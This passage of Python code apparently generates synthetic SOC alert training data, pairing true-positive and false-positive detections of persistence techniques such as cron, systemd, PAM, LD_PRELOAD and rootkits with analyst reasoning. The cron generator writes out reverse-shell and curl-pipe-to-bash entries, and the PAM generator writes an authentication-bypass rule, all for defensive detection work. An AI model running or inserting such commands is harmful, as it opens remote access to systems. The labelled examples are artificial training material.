        "targeting specific OUs, with change management review. An interactive user account "
        "modifying gPCFileSysPath and writing to SYSVOL during off-hours without a ticket "
        "has no authorized business purpose.",
        f"LDAP modify on gPCFileSysPath/gplink (GPO link/path modification). "
        "SMB write to SYSVOL\\Policies\\...\\ScheduledTasks\\ "
        "(injected scheduled task will replicate automatically). "
        f"Task action='{p['task_action'][:40]}' (encoded PowerShell payload). "
        f"~{p['targets']} machines will receive and execute this task at next Group Policy refresh "
        "(every 90–120 minutes by default).",
        f"Domain-wide persistence established via GPO injection. "
        f"Estimated {p['targets']} domain-joined computers will execute the payload. "
        "This is a mass-compromise persistence technique.",
        "GPO abuse for domain-wide scheduled task persistence confirmed.",
        "MITRE T1484.001 (Domain Policy Modification: Group Policy). "
        "Remove injected scheduled task from SYSVOL, revert GPO changes, quarantine source host, audit all affected machines.",
    )
    return prompt, cot, "true_positive"

def _gpo_fp(i):
    p = {"user":"svc-gpo-admin","gpo":"Security Baseline v2.1",
         "attr":"gPCMachineExtensionNames","ticket":f"CHG-{random.randint(10000,99999)}",
         "change_window":"maintenance-Sunday-02:00","approver":"CISO"}
    prompt = (f"Domain Controller -- GPO Modification.\n"
              f"  Account: {p['user']}  GPO: {p['gpo']}\n"
              f"  LDAP_Modified: {p['attr']}\n"
              f"  change_ticket={p['ticket']}  change_window={p['change_window']}\n"
              f"  approved_by={p['approver']}  purpose=security_baseline_update")
    cot = _cot(
        "Dedicated GPO admin account modifying security baseline GPO with approved change ticket and CISO sign-off.",
        f"account=svc-gpo-admin (dedicated service account). Ticket {p['ticket']} with CISO approval. Maintenance window.",
        "Authorized security baseline update -- dedicated account, ticket, approver, maintenance window.",
        "Authorized GPO security baseline update -- ticket, approver, maintenance window.",
        "T1484.001 -- AUTHORIZED GPO CHANGE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 9. IPPrintC2
#    Evidence: HTTP/S GET/POST to /printers/*/printer endpoint,
#              printer port added, base64-encoded print job names,
#              regular polling of printer queue, IIS/print service logs
#    Admin FP: Legitimate IPP printer management (known print server, std URI)
# ═══════════════════════════════════════════════════════════════════════════════

def _ipp_tp(i):
    c2      = _ip_ext()
    poll_s  = random.randint(15, 120)
    jobs    = random.randint(3, 20)
    p = {"src":_ip_int(),"c2":c2,"poll_s":poll_s,
         "uri":f"https://{c2}/printers/af/.printer",
         "poll_cv":round(random.uniform(0.01,0.08),4),
         "job_names_b64":True,"print_port_added":True,
         "ipp_jobs":jobs,"response_size":random.randint(64,512)}
    prompt = (f"Network Tap -- Internet Printing Protocol C2 Channel.\n"
              f"Source: {p['src']} → {p['c2']}\n"
              f"  URI: {p['uri']}\n"
              f"  poll_interval_s={p['poll_s']}  cv={p['poll_cv']:.4f}\n"
              f"  print_job_names_base64_encoded=YES\n"
              f"  print_port_added_to_system=YES\n"
              f"  ipp_job_count={p['ipp_jobs']}\n"
              f"  response_size_bytes={p['response_size']}\n"
              f"  port_class=web  dst=external_ip")
    cot = _cot(
        "Legitimate IPP traffic reaches corporate print servers with known hostnames on the internal network "
        "or trusted print services (HP, Xerox). External IP destinations for printer URIs are not legitimate "
        "enterprise printing. Production print jobs have descriptive names, not base64 strings.",
        f"IPP endpoint /printers/af/.printer on external IP {p['c2']} -- attacker-controlled print server. "
        f"poll_interval={p['poll_s']}s with CV={p['poll_cv']:.4f} (machine-generated polling). "
        "Base64-encoded job names = encoded commands disguised as print job names. "
        "Print port added to system = persistence mechanism for polling. "
        f"{p['ipp_jobs']} 'print jobs' processed = {p['ipp_jobs']} C2 command cycles.",
        f"Host {p['src']} is using the Windows Print Service as a C2 channel. "
        "Commands are encoded in printer job names; responses are printed to files on the C2 server. "
        "This traffic pattern blends into normal print service communication.",
        "IPP-based C2 channel confirmed -- command execution via print job polling.",
        "MITRE T1071.002 (Application Layer Protocol: File Transfer) via IPP. "
        "Block print port, remove printer config, isolate host.",
    )
    return prompt, cot, "true_positive"

def _ipp_fp(i):
    p = {"srv": "print.corp.local", "uri": "https://print.corp.local/printers/HR-MFP/.printer",
         "internal": True, "cert": "corp-pki"}
    prompt = (f"Network Tap -- IPP Print Job.\n"
              f"  URI: {p['uri']}\n"
              f"  is_internal_dst=YES  server={p['srv']}\n"
              f"  cert_issuer={p['cert']}  job_names=Document1.pdf\n"
              f"  registered_in_print_cmdb=YES")
    cot = _cot(
        "Internal corporate print server with corp PKI cert and descriptive job names.",
        f"dst=internal. server={p['srv']} (registered). cert={p['cert']}. Normal job names.",
        "Authorized corporate IPP printing -- internal server, corp cert, normal job names.",
        "Authorized corporate print job. No action.",
        "T1071.002 -- AUTHORIZED PRINT SERVICE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 10. WebShellPersist
#     Evidence: ASPX/JSP file written to web root by w3wp/IIS process,
#               csc.exe spawned from w3wp.exe (runtime C# compilation),
#               HTTP POST with encrypted body to non-standard URI,
#               cmd.exe/powershell.exe child of w3wp.exe
#     Admin FP: Authorized ASP.NET deployment via deployment pipeline
# ═══════════════════════════════════════════════════════════════════════════════

def _wsp_tp(i):
    shells = ["help.aspx","error.aspx","admin.aspx","default.aspx","upload.php","index.jsp"]
    p = {"host":_host(),"webroot":r"C:\inetpub\wwwroot",
         "shell":random.choice(shells),
         "written_by":"w3wp.exe" if i%2==0 else "powershell.exe",
         "csc_spawned":i%3!=0,"cmd_spawned":True,
         "http_post_uri":f"/files/{random.choice(shells)}",
         "post_body_encrypted":True,
         "child_proc":random.choice(["cmd.exe","powershell.exe","whoami.exe","ipconfig.exe"])}
    prompt = (f"Windows Host + Network Tap -- Web Shell Persistence.\n"
              f"Host: {p['host']}\n"
              f"  FileCreated: {p['webroot']}\\{p['shell']}\n"
              f"  WrittenByProcess: {p['written_by']}\n"
              f"  csc.exe_spawned_from_w3wp: {'YES (runtime C# compilation)' if p['csc_spawned'] else 'NO'}\n"
              f"  child_process_from_w3wp: {p['child_proc']}\n"
              f"  HTTP_POST_URI: {p['http_post_uri']}\n"
              f"  POST_body_encrypted: {p['post_body_encrypted']}\n"
              f"  IIS_log_entries_for_uri: YES")
    cot = _cot(
        "IIS/w3wp.exe never creates files in the web root during normal operation -- it serves "
        "pre-deployed content. File creation in web root from w3wp.exe is a server-side code execution "
        "indicator. Legitimate deployments write files via deployment pipelines (Kudu, CI/CD), not the web worker process.",
        f"File {p['shell']} written to web root by {p['written_by']} (web worker process -- not a deployment tool). "
        + (f"csc.exe spawned from w3wp.exe -- web shell compiling C# payload at runtime. " if p['csc_spawned'] else "")
        + f"{p['child_proc']} spawned from w3wp.exe -- web shell executed OS command. "
        "HTTP POST to non-standard URI with encrypted body = attacker issuing commands via web shell. "
        "IIS logs confirm shell invocation.",
        f"Host {p['host']} web server is compromised. Web shell provides persistent "
        "interactive OS-level access via HTTP/HTTPS. Survives reboots as long as file exists in web root.",
        "Web shell persistence confirmed -- OS command execution via web worker process.",
        "MITRE T1505.003 (Server Software Component: Web Shell). "
        "Remove shell file, patch initial vector, review IIS logs, isolate server.",
    )
    return prompt, cot, "true_positive"

def _wsp_fp(i):
    p = {"file": "api_health.aspx", "written_by": "msdeploy.exe",
         "pipeline": "Azure DevOps Release Pipeline", "ticket": f"REL-{random.randint(100,999)}"}
    prompt = (f"Windows Host -- Web File Deployment.\n"
              f"  FileCreated: C:\\inetpub\\wwwroot\\{p['file']}\n"
              f"  WrittenByProcess: {p['written_by']}\n"
              f"  deployment_pipeline={p['pipeline']}  ticket={p['ticket']}\n"
              f"  no_child_process_spawned=YES  signed_deploy_tool=YES")
    cot = _cot(
        "msdeploy writing to web root as part of Azure DevOps release pipeline -- authorized deployment.",
        f"written_by=msdeploy.exe (Microsoft deployment tool). No child processes. Pipeline {p['pipeline']}. Ticket.",
        "Authorized web application deployment -- deployment pipeline, signed tool, no OS command execution.",
        "Authorized web deployment via msdeploy -- pipeline, ticket, no child processes.",
        "T1505.003 -- AUTHORIZED DEPLOYMENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 11. CcmBackdoor (SCCM CCM Messaging Hijack)
#     Evidence: COM CLSID registration for rogue CCM endpoint,
#               WMI service endpoint object created,
#               HTTPS traffic on unusual port impersonating CCM protocol
#     Admin FP: Legitimate SCCM client communication
# ═══════════════════════════════════════════════════════════════════════════════

def _ccm_tp(i):
    p = {"host":_host(),"src":_ip_int(),
         "clsid":_guid(),"regasm":"YES",
         "wmi_endpoint_created":True,"c2":_ip_ext(),
         "port":random.choice([8530,8531,443,4443]),
         "impersonates":"CCMMessaging protocol"}
    prompt = (f"Windows Host -- SCCM CCM Backdoor Persistence.\n"
              f"Host: {p['host']}\n"
              f"  COM_CLSID_registered: {p['clsid']}  (via RegAsm.exe)\n"
              f"  WMI_service_endpoint_object_created: {p['wmi_endpoint_created']}\n"
              f"  C2_destination: {p['c2']}:{p['port']}\n"
              f"  protocol_impersonated: {p['impersonates']}\n"
              f"  source_binary: unsigned, in %TEMP%\n"
              f"  persistence_trigger: WMI service endpoint (survives reboot)")
    cot = _cot(
        "SCCM client communication uses CcmExec.exe with a registered service account "
        "communicating to known SCCM management points. An unsigned binary in %TEMP% "
        "registering a COM CLSID and creating WMI service endpoint objects is not "
        "an authorized SCCM component.",
        "COM CLSID registration via RegAsm.exe (registering .NET assembly as COM server). "
        "WMI service endpoint object -- hijacks CCM messaging channel. "
        f"C2 destination {p['c2']}:{p['port']} (external, not internal SCCM management point). "
        "Unsigned binary in %TEMP%. "
        "Persistence via WMI service endpoint survives reboots without Run keys or services.",
        f"Host {p['host']}: SCCM CCM messaging channel hijacked for C2. "
        "Traffic appears as legitimate SCCM client communication. "
        "Extremely stealthy persistence -- not visible in standard persistence checkers.",
        "SCCM CCM messaging backdoor confirmed -- COM hijack + WMI endpoint persistence.",
        "MITRE T1546.015 (Event Triggered Execution: Component Object Model Hijacking). "
        "Remove COM registration, delete WMI endpoint object, remove binary.",
    )
    return prompt, cot, "true_positive"

def _ccm_fp(i):
    p = {"clsid":_guid(),"binary":r"C:\Program Files\Configuration Manager\CcmExec.exe","signed":True}
    prompt = (f"Windows Host -- SCCM Agent COM Registration.\n"
              f"  CLSID: {p['clsid']}\n"
              f"  Binary: {p['binary']}\n"
              f"  signed={p['signed']}  vendor=Microsoft_SCCM  registered_by=CCMSetup.exe")
    cot = _cot(
        "Microsoft SCCM agent COM registration from signed CCMSetup.exe in Program Files.",
        f"binary=C:\\Program Files (vendor path). Signed by Microsoft. registered_by=CCMSetup.exe.",
        "Authorized SCCM agent component registration.",
        "Authorized SCCM agent COM registration. No action.",
        "T1546.015 -- AUTHORIZED SCCM AGENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 12. LinuxCronPersistence
#     Evidence: Write to /etc/cron.d/ or user crontab outside of root/admin
#               session, cron entry points to non-standard path,
#               cron-triggered outbound TCP at scheduled interval
#     Admin FP: IT admin adding legitimate maintenance cron job
# ═══════════════════════════════════════════════════════════════════════════════

def _lcp_tp(i):
    cron_paths = ["/etc/cron.d/system-update","/var/spool/cron/crontabs/root",
                  "/etc/cron.hourly/check","/etc/profile.d/init.sh"]
    payloads   = [
        f"* * * * * root bash -i >& /dev/tcp/{_ip_ext()}/{random.randint(1024,65535)} 0>&1",
        f"*/5 * * * * /tmp/.{random.randint(100,999)}/agent -c {_ip_ext()}",
        f"@reboot root /var/tmp/.cache/svc --daemon",
        f"0 * * * * curl -s http://{_ip_ext()}/update.sh | bash",
    ]
    p = {"host":_host(),"user":_user(),"path":random.choice(cron_paths),
         "entry":random.choice(payloads),"uid":random.choice([0,1000,1001]),
         "written_by":random.choice(["bash","python3","curl","sh"])}
    prompt = (f"Linux Sentinel -- Cron Job Persistence.\n"
              f"Host: {p['host']}  User: {p['user']} (uid={p['uid']})\n"
              f"  file_written: {p['path']}\n"
              f"  cron_entry: {p['entry']}\n"
              f"  written_by_process: {p['written_by']}\n"
              f"  trigger: cron daemon (automatic)")
    cot = _cot(
        "Legitimate maintenance cron jobs are created by root during administrative sessions "
        "pointing to scripts in /opt/ or /usr/local/bin/ with descriptive comments. "
        f"Cron entries with /dev/tcp redirects or piping curl to bash have no admin use case.",
        f"cron_entry='{p['entry'][:80]}' -- "
        + ("reverse shell via bash TCP redirect." if "dev/tcp" in p['entry'] else
           "download-and-execute (curl|bash) pattern." if "curl" in p['entry'] else
           "hidden binary in /tmp or /var/tmp.")
        + f" Written by {p['written_by']} (not crontab -e from root shell). "
        + f"path={p['path']} (cron directory, executes on schedule).",
        f"Host {p['host']}: cron daemon will trigger malicious action periodically. "
        "Persists across reboots. Outbound connection or hidden binary execution on every trigger.",
        "Cron-based persistence confirmed -- reverse shell or download-execute pattern.",
        "MITRE T1053.003 (Scheduled Task/Job: Cron). Remove cron entry, kill active reverse shell, audit /tmp.",
    )
    return prompt, cot, "true_positive"

def _lcp_fp(i):
    p = {"path": "/etc/cron.d/logrotate-custom",
         "entry": "0 2 * * * root /usr/sbin/logrotate /etc/logrotate.conf",
         "ticket": f"OPS-{random.randint(100,999)}"}
    prompt = (f"Linux Sentinel -- Cron Job Addition.\n"
              f"  file_written: {p['path']}\n"
              f"  cron_entry: {p['entry']}\n"
              f"  added_by: root (SSH session)  ticket={p['ticket']}")
    cot = _cot(
        "Root admin adding logrotate cron job pointing to /usr/sbin/logrotate -- standard maintenance.",
        f"entry uses /usr/sbin/logrotate (system binary). root SSH session. Ticket {p['ticket']}.",
        "Authorized system maintenance cron job -- system binary, root session, ticket.",
        "Authorized maintenance cron job. No action.",
        "T1053.003 -- AUTHORIZED MAINTENANCE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 13. SystemdServicePersistence
#     Evidence: New .service unit file in /etc/systemd/system/,
#               systemctl enable on new service,
#               ExecStart pointing to /tmp/ or non-standard binary,
#               service making outbound connections
#     Admin FP: IT deploying monitoring agent via Ansible
# ═══════════════════════════════════════════════════════════════════════════════

def _sysd_tp(i):
    svc_names = ["network-monitor","systemd-synchelper","kernel-update","cloud-connector","ssh-agent-helper"]
    exec_paths = [
        f"/tmp/.{random.randint(100,999)}/agent",
        f"/var/tmp/.cache/svc",
        f"/dev/shm/runner",
        f"/home/{_user()}/.config/svc",
    ]
    p = {"host":_host(),"unit_file":f"/etc/systemd/system/{random.choice(svc_names)}.service",
         "exec_start":random.choice(exec_paths),
         "restart_policy":"on-failure","user":"root",
         "enabled":True,"outbound":_ip_ext()}
    prompt = (f"Linux Sentinel -- Systemd Service Persistence.\n"
              f"Host: {p['host']}\n"
              f"  unit_file_created: {p['unit_file']}\n"
              f"  ExecStart: {p['exec_start']}\n"
              f"  Restart: {p['restart_policy']}\n"
              f"  User: {p['user']}\n"
              f"  systemctl_enabled: {p['enabled']} (survives reboot)\n"
              f"  outbound_connection_after_start: {p['outbound']}")
    cot = _cot(
        "Legitimate systemd services are deployed by package managers (apt/yum) or configuration "
        "management tools (Ansible, Salt) with binaries in /usr/, /opt/, or /usr/local/. "
        f"A service with ExecStart pointing to /tmp/ or /dev/shm/ is a transient execution path "
        "that has no legitimate service use.",
        f"unit_file={p['unit_file']} created (not by package manager). "
        f"ExecStart={p['exec_start']} (/tmp, /var/tmp, /dev/shm = non-persistent paths used by malware). "
        f"Restart=on-failure (self-healing persistence). User=root (maximum privilege). "
        f"systemctl_enabled=True (auto-start on every boot). "
        f"Outbound connection to {p['outbound']} after start = C2 callback.",
        f"Host {p['host']}: persistent SYSTEM-equivalent service with C2 callback established. "
        "Restart policy ensures survival of process kills. Boot persistence via systemctl enable.",
        "Systemd service persistence confirmed -- temp-path binary + root context + C2 callback.",
        "MITRE T1543.002 (Create or Modify System Process: Systemd Service). "
        "systemctl disable && systemctl stop, delete unit file, kill binary.",
    )
    return prompt, cot, "true_positive"

def _sysd_fp(i):
    p = {"unit": "/etc/systemd/system/node_exporter.service",
         "exec": "/usr/local/bin/node_exporter",
         "user": "prometheus", "deploy": "Ansible"}
    prompt = (f"Linux Sentinel -- Systemd Service Deployment.\n"
              f"  unit_file: {p['unit']}\n"
              f"  ExecStart: {p['exec']}\n"
              f"  User: {p['user']}  deploy_method={p['deploy']}\n"
              f"  binary_in_standard_path=YES  signed=YES")
    cot = _cot(
        "Prometheus node_exporter deployed via Ansible to /usr/local/bin/ under non-root service account.",
        f"ExecStart=/usr/local/bin/ (standard). User=prometheus (dedicated service account). Ansible deploy.",
        "Authorized monitoring agent deployment -- standard path, service account, Ansible.",
        "Authorized systemd service deployment. No action.",
        "T1543.002 -- AUTHORIZED DEPLOYMENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 14. PAMBackdoor
#     Evidence: /etc/pam.d/ config file modified, pam_exec.so or new .so added,
#               auth succeeds for non-existent users (honeypot trigger),
#               credentials logged by PAM hook
#     Admin FP: IT adding MFA PAM module with approved change
# ═══════════════════════════════════════════════════════════════════════════════

def _pam_tp(i):
    targets = ["/etc/pam.d/sshd","/etc/pam.d/login","/etc/pam.d/sudo","/etc/pam.d/common-auth"]
    methods = [
        "pam_exec.so /tmp/.hook.sh",
        f"pam_so.so /lib/x86_64-linux-gnu/security/malicious_{random.randint(100,999)}.so",
        "auth sufficient pam_permit.so (bypasses all auth)",
    ]
    p = {"host":_host(),"target":random.choice(targets),
         "method":random.choice(methods),
         "honeypot_trigger":i%2==0,"credential_log":True,
         "unsigned_module":True}
    prompt = (f"Linux Sentinel -- PAM Configuration Backdoor.\n"
              f"Host: {p['host']}\n"
              f"  pam_config_modified: {p['target']}\n"
              f"  injected_rule: {p['method']}\n"
              f"  unsigned_module: {p['unsigned_module']}\n"
              + (f"  honeypot_auth_succeeded=YES (known-invalid username authenticated)\n" if p['honeypot_trigger'] else "")
              + (f"  credential_logging_suspected=YES\n" if p['credential_log'] else ""))
    bypass_note = ("pam_permit.so grants authentication to anyone regardless of credential. " if "pam_permit" in p['method']
                   else f"pam_exec.so executes a script at every auth attempt -- credential harvesting + shell. ")
    cot = _cot(
        "Legitimate PAM configuration changes add supported vendor modules (Google Authenticator, "
        "Duo Security) with documented change tickets. pam_exec.so pointing to /tmp/ scripts and "
        "unsigned custom .so files are not vendor PAM modules.",
        f"pam_config={p['target']} modified (authentication chain for SSH/sudo/login). "
        + bypass_note
        + ("Honeypot user authenticated -- backdoor password in use. " if p['honeypot_trigger'] else "")
        + ("Credential logging suspected -- every auth attempt captured by hook. " if p['credential_log'] else ""),
        f"Host {p['host']}: every SSH/sudo/login authentication is affected. "
        "Attacker has persistent access with a master password and/or credential harvest. "
        "Authentication integrity on this host is completely compromised.",
        "PAM backdoor confirmed -- auth chain modified for persistent access.",
        "MITRE T1556.003 (Modify Authentication Process: Pluggable Authentication Modules). "
        "Restore original PAM config, remove malicious module, rotate all credentials used on host.",
    )
    return prompt, cot, "true_positive"

def _pam_fp(i):
    p = {"target": "/etc/pam.d/sshd",
         "module": "pam_google_authenticator.so",
         "ticket": f"SEC-{random.randint(100,999)}", "vendor": "Google"}
    prompt = (f"Linux Sentinel -- PAM MFA Module Addition.\n"
              f"  pam_config: {p['target']}\n"
              f"  module_added: {p['module']}\n"
              f"  vendor={p['vendor']}  signed=YES  change_ticket={p['ticket']}\n"
              f"  documented_deployment=YES")
    cot = _cot(
        "Google Authenticator PAM module added by IT for MFA -- documented, signed, ticketed.",
        f"module={p['module']} (Google-signed). Ticket {p['ticket']}. Documented deployment.",
        "Authorized MFA PAM module addition -- signed vendor module, change ticket.",
        "Authorized MFA deployment via PAM. No action.",
        "T1556.003 -- AUTHORIZED MFA DEPLOYMENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 15. LDPreloadBackdoor
#     Evidence: Write to /etc/ld.so.preload, new .so in non-standard path,
#               all processes loading unexpected library (Sysmon/eBPF),
#               library intercepts execve/connect/open
#     Admin FP: Performance profiling library (temporary, approved)
# ═══════════════════════════════════════════════════════════════════════════════

def _ldp_tp(i):
    methods = [
        ("/etc/ld.so.preload", f"/tmp/.lib{random.randint(100,999)}.so"),
        ("/etc/ld.so.preload", "/var/tmp/.cache/libssl.so"),
        ("~/.bashrc LD_PRELOAD=", f"/home/{_user()}/.local/lib/hook.so"),
    ]
    preload_file, lib_path = random.choice(methods)
    p = {"host":_host(),"user":_user(),"preload_file":preload_file,"lib_path":lib_path,
         "hooked_syscalls":random.sample(["execve","connect","open","read","write"],
                                          k=random.randint(2,4)),
         "universal_injection":preload_file=="/etc/ld.so.preload"}
    prompt = (f"Linux Sentinel -- LD_PRELOAD Library Backdoor.\n"
              f"Host: {p['host']}  User: {p['user']}\n"
              f"  preload_config_modified: {p['preload_file']}\n"
              f"  malicious_library: {p['lib_path']}\n"
              f"  hooked_syscalls: {', '.join(p['hooked_syscalls'])}\n"
              f"  affects_all_processes: {p['universal_injection']}\n"
              f"  library_not_in_package_db: YES")
    scope = ("Every process on the system loads the malicious library." if p['universal_injection']
             else f"User {p['user']} processes load the library via shell profile.")
    cot = _cot(
        "Legitimate performance profiling libraries (gperftools, valgrind) are installed via package managers, "
        "are present in the package database, and are removed after the profiling session. "
        "A .so file in /tmp/ or /var/tmp/ added to /etc/ld.so.preload is not a profiling tool.",
        f"preload_config='{p['preload_file']}' modified → library '{p['lib_path']}' loaded into all processes. "
        f"hooked_syscalls={p['hooked_syscalls']} -- intercepts {', '.join(p['hooked_syscalls'][:2])} "
        "for credential capture and network redirection. "
        "library_not_in_package_db (not installed by apt/yum). "
        f"{scope}",
        f"Host {p['host']}: every subsequent process execution injects the malicious library. "
        "Attacker can intercept credentials, redirect network connections, and execute code "
        "in the context of any process including privileged ones.",
        "LD_PRELOAD backdoor confirmed -- universal process injection via library preload.",
        "MITRE T1574.006 (Hijack Execution Flow: Dynamic Linker Hijacking). "
        "Remove /etc/ld.so.preload entry, delete malicious .so, reboot to clear running processes.",
    )
    return prompt, cot, "true_positive"

def _ldp_fp(i):
    p = {"lib": "/usr/lib/x86_64-linux-gnu/libprofiler.so",
         "method": "LD_PRELOAD set in /etc/profile.d/profiling.sh",
         "ticket": f"PERF-{random.randint(100,999)}", "duration": "48h"}
    prompt = (f"Linux Sentinel -- LD_PRELOAD Set for Profiling.\n"
              f"  library: {p['lib']}\n"
              f"  set_via: {p['method']}\n"
              f"  package_installed=YES  ticket={p['ticket']}  duration={p['duration']}")
    cot = _cot(
        "Google gperftools profiler set via profile.d for 48h performance profiling -- packaged, ticketed.",
        f"library={p['lib']} (from package manager). ticket={p['ticket']}. Temporary ({p['duration']} window).",
        "Authorized performance profiling session -- packaged library, ticket, time-bounded.",
        "Authorized performance profiling -- packaged, ticketed, temporary.",
        "T1574.006 -- AUTHORIZED PROFILING. Remove after 48h.",
        action="monitor",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 16. LKMRootkitPersistence
#     Evidence: insmod/modprobe of non-standard .ko file, module not visible
#               in /proc/modules or lsmod after load (self-hiding),
#               process/file hiding behavior, syscall table modification
#     Admin FP: IT loading signed vendor kernel module (DKMS)
# ═══════════════════════════════════════════════════════════════════════════════

def _lkm_tp(i):
    ko_paths = [
        f"/tmp/.mod{random.randint(100,999)}.ko",
        f"/var/tmp/kern.ko",
        f"/root/.cache/mod.ko",
    ]
    p = {"host":_host(),"ko_path":random.choice(ko_paths),
         "loader":"insmod","signed":False,
         "self_hiding":i%2==0,"proc_hide":True,"file_hide":True,
         "syscall_hook":random.sample(["sys_read","sys_kill","sys_getdents","sys_open"], k=2),
         "network_c2":_ip_ext() if i%3==0 else None}
    prompt = (f"Linux Sentinel -- LKM Rootkit Kernel Module Load.\n"
              f"Host: {p['host']}\n"
              f"  module_path: {p['ko_path']}\n"
              f"  loader: {p['loader']}\n"
              f"  signed: {p['signed']}\n"
              f"  self_hiding_from_lsmod: {'YES -- module absent from /proc/modules after load' if p['self_hiding'] else 'NO'}\n"
              f"  process_hiding: {p['proc_hide']}\n"
              f"  file_hiding: {p['file_hide']}\n"
              f"  syscalls_hooked: {', '.join(p['syscall_hook'])}\n"
              + (f"  kernel_network_connection: {p['network_c2']}\n" if p['network_c2'] else ""))
    cot = _cot(
        "Legitimate kernel modules (NIC drivers, storage adapters) are installed by DKMS from "
        "signed packages in /lib/modules/$(uname -r)/. They appear in lsmod and /proc/modules. "
        "No legitimate module hides itself from the kernel module list after loading.",
        f"Module loaded from {p['ko_path']} (non-standard path, not /lib/modules/). "
        f"Unsigned module (legitimate modules are signed with kernel key). "
        + ("Self-hides from /proc/modules -- definitional rootkit behavior. " if p['self_hiding'] else "")
        + f"Hooks {', '.join(p['syscall_hook'])} syscalls (kernel-level interception). "
        + f"Process and file hiding active -- attacker processes and files invisible to userspace tools. "
        + (f"Kernel-level C2 connection to {p['network_c2']}." if p['network_c2'] else ""),
        f"Host {p['host']}: LKM rootkit operational at ring 0. Standard detection tools (ps, ls, lsmod) "
        "compromised -- kernel reports false information. Host must be considered fully compromised.",
        "LKM rootkit confirmed -- kernel-level persistence with process/file hiding.",
        "MITRE T1547.006 (Boot/Logon Autostart: Kernel Modules/Extensions). "
        "Do NOT trust userspace tools on this host. Boot from live media for forensic analysis. Full reimaging required.",
    )
    return prompt, cot, "true_positive"

def _lkm_fp(i):
    p = {"ko": "/lib/modules/5.15.0/updates/dkms/vmw_vmci.ko",
         "loader": "modprobe", "signed": True, "package": "open-vm-tools"}
    prompt = (f"Linux Sentinel -- Kernel Module Load.\n"
              f"  module: {p['ko']}\n"
              f"  loader: {p['loader']}  signed={p['signed']}\n"
              f"  package={p['package']}  in_lsmod=YES  dkms_managed=YES")
    cot = _cot(
        "VMware VMCI module loaded from DKMS-managed /lib/modules path -- signed, packaged, in lsmod.",
        f"path=/lib/modules/ (standard). signed=True. package={p['package']}. in_lsmod=YES (not hiding).",
        "Authorized DKMS-managed kernel module -- standard path, signed, visible.",
        "Authorized kernel module from open-vm-tools package. No action.",
        "T1547.006 -- AUTHORIZED KERNEL MODULE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 17. EBPFRootkitPersistence
#     Evidence: bpf() syscall from non-root or unexpected context,
#               tracepoint hooks on sys_execve or network syscalls,
#               GOT patching via /proc/pid/mem writes,
#               covert TCP trigger pattern (crafted packet)
#     Admin FP: Authorized BPF observability tool (bpftrace, perf)
# ═══════════════════════════════════════════════════════════════════════════════

def _ebpf_tp(i):
    hook_types = ["sys_execve tracepoint","kprobe on tcp_sendmsg","xdp network hook","uprobe on libc:connect"]
    p = {"host":_host(),"user":_user(),"uid":random.choice([0,1000]),
         "bpf_prog_type":random.choice(["BPF_PROG_TYPE_TRACEPOINT","BPF_PROG_TYPE_KPROBE","BPF_PROG_TYPE_XDP"]),
         "hook":random.choice(hook_types),
         "proc_mem_write":i%2==0,"got_patched":i%2==0,
         "covert_trigger":i%3==0,"trigger_pattern":"crafted TCP SYN with specific IP ID field",
         "c2":_ip_ext() if i%3==0 else None}
    prompt = (f"Linux Sentinel -- eBPF Rootkit / Covert Backdoor.\n"
              f"Host: {p['host']}  User: {p['user']} (uid={p['uid']})\n"
              f"  bpf_syscall_invoked=YES  prog_type={p['bpf_prog_type']}\n"
              f"  hook_point: {p['hook']}\n"
              + (f"  /proc/pid/mem_write=YES (GOT patching via kernel-space write)\n" if p['proc_mem_write'] else "")
              + (f"  GOT_entry_patched=YES  target_function_hijacked=YES\n" if p['got_patched'] else "")
              + (f"  covert_trigger_pattern=YES ({p['trigger_pattern']})\n" if p['covert_trigger'] else "")
              + (f"  reverse_shell_spawned → {p['c2']}\n" if p['c2'] else ""))
    cot = _cot(
        "Legitimate eBPF observability tools (bpftrace, perf, cilium) are invoked interactively "
        "by authorized users, run for bounded periods, and do not write to /proc/pid/mem or "
        "modify GOT entries. Production eBPF programs do not install covert network triggers.",
        f"bpf() syscall loading {p['bpf_prog_type']} (kernel-level hook). "
        f"Hooked {p['hook']} -- intercepts execution/network at kernel level. "
        + (f"/proc/{{}}/mem write → GOT patching: redirect function calls in target process "
           "(bypasses ASLR, stack canaries, DEP). " if p['proc_mem_write'] else "")
        + (f"Covert trigger: {p['trigger_pattern']} activates backdoor without persistent listeners. " if p['covert_trigger'] else "")
        + (f"Reverse shell to {p['c2']}." if p['c2'] else ""),
        f"Host {p['host']}: eBPF rootkit operational. "
        "Standard detection tools may not see this -- hooks operate at kernel level. "
        "Process execution, network traffic, and file access are potentially modified in kernel space.",
        "eBPF rootkit confirmed -- kernel-level hooking with GOT patching and covert backdoor.",
        "MITRE T1014 (Rootkit) + T1056.004 (API Hooking). "
        "Full kernel integrity validation required. Boot from live media. Reimaging likely necessary.",
    )
    return prompt, cot, "true_positive"

def _ebpf_fp(i):
    p = {"tool":"bpftrace","hook":"uprobe:/bin/bash:readline","user":"sre-ops",
         "ticket":f"DEBUG-{random.randint(100,999)}","duration":"2h"}
    prompt = (f"Linux Sentinel -- eBPF Tracing Session.\n"
              f"  tool={p['tool']}  hook={p['hook']}\n"
              f"  user={p['user']}  ticket={p['ticket']}  duration={p['duration']}\n"
              f"  no_proc_mem_write=YES  no_network_trigger=YES  interactive_session=YES")
    cot = _cot(
        "bpftrace uprobe tracing by SRE team for 2h debugging session -- authorized, interactive, ticketed.",
        f"interactive_session=YES. No /proc/mem write. No network trigger. Ticket {p['ticket']}. Bounded {p['duration']}.",
        "Authorized short-term eBPF debugging session -- no rootkit indicators.",
        "Authorized bpftrace debugging session. Remove hook after session.",
